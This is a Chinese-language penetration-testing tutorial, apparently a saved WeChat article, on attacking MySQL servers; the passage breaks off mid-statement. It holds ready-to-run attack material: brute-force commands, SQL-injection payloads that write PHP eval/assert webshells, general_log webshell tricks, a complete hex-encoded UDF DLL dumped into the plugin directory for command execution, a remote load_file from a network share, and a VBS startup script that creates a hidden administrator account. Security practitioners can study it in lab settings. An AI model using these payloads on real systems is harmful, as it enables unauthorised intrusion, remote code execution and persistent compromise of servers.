<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MydR75_IXY2BqXhSNDdKQA)

‍‍‍![](https://mmbiz.qpic.cn/mmbiz_png/yv5xg29CADoqaxxZZFXJRfP8Sd0wCXgy21McgQ6Rsg6XvJGyZagbEXfjT24AzcMYEdALo2jDRODv3cWkbiaFibcw/640?wx_fmt=png)‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍  

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaAkcXYjGFibvhEib9Fr7OicyeoEI1ya3AFaqyn5mK59V4OzgmXRyhN6Y1HGQv8WdrQfEMuXZZbgJmWw/640?wx_fmt=gif)

目录

0x01 Mysql 信息收集

    1. 使用 Nmap 进行 mysql 的信息收集

    2. 通过 msf 探测 mysql 信息

    3. 使用 sqlmap 进行 sql 注入收集 mysql 版本信息

0x02 获取 mysql 密码

    1. 使用 msf 模块爆破

    2.nmap 脚本进行爆破

    3.sqlmap 的 sql-shell 查询哈希值

    4. 从网站泄露的源代码中查找配置文件获取用户名密码

0x03 通过 Mysql 向服务器写 shell

    1. 利用联合注入写入 shell

    2. 当 sql 注入为盲注或者报错注入时，可以使用分隔符写入 shell

    3. 当 secure_file_priv 为 NULL 写入 shell

**0x04** Mysql 提权

    1.UDF 手动提权

        1.1msf 下使用 UDF 提权

    2.mysql 启动项提权

        2.2 msf 启动项提权

    3. 反弹端口提权

    4.CVE-2016-6663 提权

**0x01 **Mysql 信息收集****

1.1 使用 Nmap 进行 mysql 的信息收集

```
nmap -sC -sV 192.168.0.107 -p3306
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2WgqIZGUhWKCibA5qmWjyiaTqPO9XsQULTiapcGOwfYXW9BPUFKI2Jopfw/640?wx_fmt=png)

或者使用 nmap 的 nse 脚本对 MySQL 进行扫描

```
└─# ls -lah /usr/share/nmap/scripts/*mysql*
-rw-r--r-- 1 root root 6.5K Oct 12  2020 /usr/share/nmap/scripts/mysql-audit.nse
-rw-r--r-- 1 root root 3.0K Oct 12  2020 /usr/share/nmap/scripts/mysql-brute.nse
-rw-r--r-- 1 root root 2.9K Oct 12  2020 /usr/share/nmap/scripts/mysql-databases.nse
-rw-r--r-- 1 root root 3.2K Oct 12  2020 /usr/share/nmap/scripts/mysql-dump-hashes.nse
-rw-r--r-- 1 root root 2.0K Oct 12  2020 /usr/share/nmap/scripts/mysql-empty-password.nse
-rw-r--r-- 1 root root 3.4K Oct 12  2020 /usr/share/nmap/scripts/mysql-enum.nse
-rw-r--r-- 1 root root 3.4K Oct 12  2020 /usr/share/nmap/scripts/mysql-info.nse
-rw-r--r-- 1 root root 3.7K Oct 12  2020 /usr/share/nmap/scripts/mysql-query.nse
-rw-r--r-- 1 root root 2.8K Oct 12  2020 /usr/share/nmap/scripts/mysql-users.nse
-rw-r--r-- 1 root root 3.2K Oct 12  2020 /usr/share/nmap/scripts/mysql-variables.nse
-rw-r--r-- 1 root root 6.9K Oct 12  2020 /usr/share/nmap/scripts/mysql-vuln-cve2012-2122.nse
```

```
nmap --script=mysql-enum 192.168.0.107 -p3306    
#枚举mysql用户名，结果不一定准确
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2ic2wSam8Yjz4vEoGIJWqJGAibbabZPG2qwr4XkeYQZGgSm7FQEzj7dTg/640?wx_fmt=png)

1.2 通过 msf 探测 mysql 信息

```
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum            
use auxiliary/scanner/mysql/mysql_schemadump           
use auxiliary/scanner/mysql/mysql_hashdump             
use auxiliary/scanner/mysql/mysql_version
```

下图以探测 mysql 版本为例

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l233pvzzGicIL4FGB3Lk1gRMmD9Y6oibYA7F8WYlfaNfeLqM9xtG7OrXdA/640?wx_fmt=png)

1.3 使用 sqlmap 进行 sql 注入收集 mysql 版本信息

```
sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1" 
--batch  --threads 10 -v 3
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l27pZENbjx7j92GVZYVEibKndhrFuQicyvZiaD4ohuAfJDIBEic8qFde0dwg/640?wx_fmt=png)

**0x02 ****获取 mysql 密码******

2.1 使用 msf 模块爆破

```
use auxiliary/scanner/mysql/mysql_login
set username root
set pass_file /usr/share/wordlists/rockyou.txt
set rhosts 192.168.0.107
run
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2IribPetb7Ih5DNBxlHduO26QbZCZQy9zVAsmfKsW6dNCCuEuql79MuA/640?wx_fmt=png)

2.2 nmap 脚本进行爆破  

```
nmap -p 3306 --script=mysql-brute.nse 
userdb=/usr/share/wordlists/user.txt 
passdb=/usr/share/wordlists/rockyou.txt 192.168.0.107
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2S9Is7lv6kQz5iad4xMZQ6GGt1VOWmGDR5P5HPX4iaW8YOzib5Obx7Ry0Q/640?wx_fmt=png)

2.3 sqlmap 的 sql-shell 查询哈希值

```
sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1" 
--batch  --threads 100 --sql-shell -v 3 
select host, user, password from mysql.user;   
 #MySQL的用户名密码哈希值保存在mysql库的user表中
 
# MySQL <= 5.6 版本
mysql> select host, user, password from mysql.user;
# MySQL >= 5.7 版本
mysql > select host,user,authentication_string from mysql.user;
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2lBiacMzc20IlXhhYFZ6niaVpv17zWsyRg2Lwk3ErXFhY3f0z2gcoCicJg/640?wx_fmt=png)

在 cmd5 网址查询

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2VKbTe4cV7BbM7y6snVqia3BSIicG2icoGpo8hAZkHl0ZQWGth3xahOicoA/640?wx_fmt=png)

2.4 从网站泄露的源代码中查找配置文件获取用户名密码  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2ES0ial2e2wjaqGwCt2nJMPq7VwkJbsMOQpDz4nmQDpiaYkxJtVCrHmkg/640?wx_fmt=png)

**0x03 ******通过 Mysql 向服务器写 shell********

条件：

*   存在 sql 注入漏洞
    
*   需要知道网站的 web 物理路径
    
*   当前用户有文件写入权限
    
*   secure_file_priv 选项支持数据导出
    

```
secure_file_priv 参数用于限制
  LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录。
secure_file_priv 为 NULL 时，
  表示限制mysqld不允许导入或导出。
secure_file_priv 为 /tmp 时，
  表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。
secure_file_priv 没有值时，
  表示不限制mysqld在任意目录的导入导出。

在 MySQL 5.5 之前 secure_file_priv 默认是空，
这个情况下可以向任意绝对路径写文件

在 MySQL 5.5之后 secure_file_priv 
默认是 NULL，这个情况下不可以写文件
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2kVE3wY2aVvA9DSoNalI85ZZica5tw0cNX5OKbT0XtmvcgibuSeZBqEhg/640?wx_fmt=png)

（1）需要修改 mysql 配置文件，my.ini 最后一行添`加secure_file_priv='C:/'，重启mysql，再次查询`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l23jbTkwINzLMSuYvzqUUY93S0b5cnUNQsfamBSFeStDp4MWtibBRc6BA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2iazAp2ftF3kvFyp8gAYdDsuAXkrHkhNWvof3iaqianMKicAVuWOibFrYwicw/640?wx_fmt=png)

（2）查看网站的绝对路径

通过 phpinfo 或者 sql 报错注入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2wvh4eptg5jN7EVr76b1iaGBVetWhGSWbxIMkZ06ynGTNApDcXEicRFmg/640?wx_fmt=png)

3.1 利用联合注入写入 shell  

```
http://192.168.0.107/sqli/Less-1/?id=-1' union 
select 1,2,'<?php @eval($_post["pass"]);?>' 
into outfile "C:\\Phpsdudy\\PHPTutorial\\WWW\\1.php"--+
 
或者把php一句话十六进制编码mysql支持hex编码
http://192.168.0.107/sqli/Less-1/?id=-1' union 
select 1,2,0x3C3F70687020406576616C28245F706F73745B2270617373225D293B3F3E 
into outfile "C:\\Phpsdudy\\PHPTutorial\\WWW\\2.php"--+
```

3.2 当 sql 注入为盲注或者报错注入时，可以使用分隔符写入 shell

```
http://192.168.0.107/sqli/Less-1/?id=-1' into outfile 
"C:\\Phpsdudy\\PHPTutorial\\WWW\\3.php" 
lines terminated 
by 0x3C3F70687020406576616C28245F706F73745B2270617373225D293B3F3E --+
```

利用分隔符写入 shell 的四种形式

```
?id=1 into outfile '物理路径' lines terminated by  (一句话hex编码)#
?id=1 into outfile '物理路径' fields terminated by (一句话hex编码)#
?id=1 into outfile '物理路径' columns terminated by (一句话hex编码)#
?id=1 into outfile '物理路径' lines starting by (一句话hex编码)#
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2IzeTeB4adhUAvbewNpKTspYu5Hs4GynN6OmGa5Wdb3wQnjTffiadPyg/640?wx_fmt=png)

**3.3 当 secure_file_priv 为 NULL 写入 shell**

Mysql 查询日志用来保存所有跟查询相关的日志，我们可以通过指定 mysql 日志的存放路径来往目标主机上写入 webshell，但是也要对生成的日志有可读可写的权限，这种日志类型默认是关闭状态的。

启用 general_ log_file 写日志方法获取 shell

条件：

*   Web 文件夹宽松权限可以写入
    
*   Windows 系统下
    
*   高权限运行 MySQL 或者 Apache
    
*   ![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2WvXK29hiaZhySyajnunyqhR3C56icSsEuDONQ843MPR0aBkSBPDS0TPQ/640?wx_fmt=png)
    

```
(1) 查看genera文件配置情况
show global variables like '%genera%';    

#general_log默认关闭，开启它可以记录用户输入的每条命令，
#尝试自定义日志文件，并向日志文件里面写入内容的话，
#那么就可以成功getshell
 
(2)关闭general_log
set global general_log =off;
 
(3)通过general_log选项来获取webshell
set global general_log= 'on';
set global general_log_file='C:/Phpsdudy/PHPTutorial/WWW/4.php'; 
   #更改日志位置
select '<?php assert($_POST["123"]);?>';    #日志中写入payload
```

**0x04 MySql 提权**

4.1 UDF 手动提权

自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version() 等方便。

提权原理：UDF 的使用需要调用其动态链接库文件（.dll 或. so），使用 UDF 提权原理大概就是通过引入恶意的 udf.dll，引入自定义函数（如 sys_eval() 函数），执行系统命令。

利用条件：

*   当前 mysql 数据库的账户有对 mysql 的 insert 和 deleter 权限，以创建和抛弃函数
    
*   当前用户拥有可以将 udf,dll 写入对应目录的权限
    
*   mysql<5.1,udf.dll 应该存放在 c:\windows 或 c:\windows\system32
    
*   mysql>5.1,udf 文件在 mysql 安装目录下的 lib/plugin 文件夹下，该文件夹默认不存在，需要手动创建
    

UDF 提权步骤

1. 查看 secure_file_priv 的值需要值为空才能导入文件

```
show variables like '%secure_file_priv%';
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l283yS3MY0yicqZFup93UjaLbNic1JvaIW546WEYJVfSicwvxuHTyMH55ug/640?wx_fmt=png)

2. 查看系统结构及 plugin 插件目录

```
select 233 into dumpfile 
  'C:\\Phpsdudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';   
   #plugin目录不存在创建该目录
show variables like '%compile%';    # 查看主机版本及架构
show variables like '%plugin%';    # 查看plugin目录
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l23UhiazphqAzOvNewsztXxvibnOu8peH2dpTEa9HoJob6RGxbxrUNG3pw/640?wx_fmt=png)

3. 在 plugin 目录下写入恶意的动态链接库文件

在 sqlmap 和 msf 目录下均有该插件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2XYIU1ObnmfjuKR3oADOoncLYjEuZ3AwbfeZf5w1kicjxSMHibpyMJnEw/640?wx_fmt=png)

sqlmap 中的动态链接库经过编码处理，需要使用 sqlmap 自带的解码工具 cloak.py 解码才能使用

```
┌──(root??kali)-[/usr/share/sqlmap/extra/cloak]
└─# python3 cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o abc.dll    
```

（1）通过 sqlmap 写入动态链接库，需要 POST 注入才能写入

```
sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1" --threads 100 --file-write="/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll" --file-dest="C:\\Phpsdudy\\PHPTutorial\\MySQL\\lib\\plugin\\a.dll"
```

（2）执行 sql 语句写入动态链接库

phpstudy 的 mysql 是 32 位的，因此要写入 32 位的 dll 文件。

```
select hex(load_file('/tmp/lib_mysqludf_sys_32.so')) into outfile "/tmp/udf_32.hex";    #本机下进行十六进制编码
#或者直接复制国光师傅转码完成的动态链接库文件内容    https://www.sqlsec.com/tools/udf.html
 
#写入udf.dll文件
SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE 'C:\\Phpsdudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll';
 
create function sys_eval returns string soname 'udf.dll';    #创建自定义函数并调用命令
select * from mysql.func;    #查看是否新增了sys_eval
select sys_eval('whoami');    #执行系统命令   
drop function sys_eval;    #删除自定义函数
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2qffqGgic4P3kYiaicBDiayqEXSyqdCnvgQ7h0Y6XRUfgMojATq5E1ovDVw/640?wx_fmt=png)

（3）远程写入动态链接库文件

```
select load_file('\\\\192.168.0.105\udf.dll') into dumpfile "C:\\Phpsdudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf2.dll";
```

### 1.1msf 下使用 UDF 提权

```
use exploit/multi/mysql/mysql_udf_payload 
set password root
run
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2Bd19VZEW2veMBJtfAnpgsHIfeZy92mjRsdrhISicEMT0v0YqibY06ulw/640?wx_fmt=png)

```
mysql:
create function sys_eval returns string soname 'AuYXClEy.dll';
select sys_eval('whoami');
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l23icpFmSf3lSEvxayzibOSa3bzOozicsJibClULYJwf14qCZXSQu5rOWTQQ/640?wx_fmt=png)

### 2.mysql 启动项提权

利用 into outfile 或者 into dumpfile 写入自定义脚本到开机自启目录下，当管理员重启服务器时，就会自动允许这些脚本，在 Windows 下可以写入 vbs 脚本或者 exe 执行文件。

```
Set WshShell=WScript.CreateObject("WScript.Shell")
WshShell.Run "net user hacker P@ssw0rd /add", 0
WshShell.Run "net localgroup administrators hacker /add", 0
```

mysql 写入 vbs 自启动脚本

```
select  
